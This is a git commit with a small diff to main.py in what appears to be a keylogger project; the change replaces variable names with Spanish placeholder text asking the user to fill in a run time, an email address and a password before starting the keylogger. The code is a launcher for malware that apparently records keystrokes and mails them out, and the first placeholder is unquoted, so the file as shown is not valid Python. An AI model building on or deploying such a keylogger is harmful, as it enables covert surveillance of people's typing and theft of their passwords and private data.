14258e1f5a3ba5c1ef8e67aa7987ff740259bda7
ZXDe <43547674+ZXDe@users.noreply.github.com>
2020-07-30 12:48:00 -0500

    Update main.py

--- main.py
+++ main.py
@@ -1,4 +1,5 @@
 import Keylogger
 
-my_keylogger = Keylogger.Keylogger(tiempo,email,contraseña)
+my_keylogger = Keylogger.Keylogger(pon el tiempo que quieres que se ejcute,"pon aqui tu correo","pon aqui tu contraseña")
 my_keylogger.start()
+
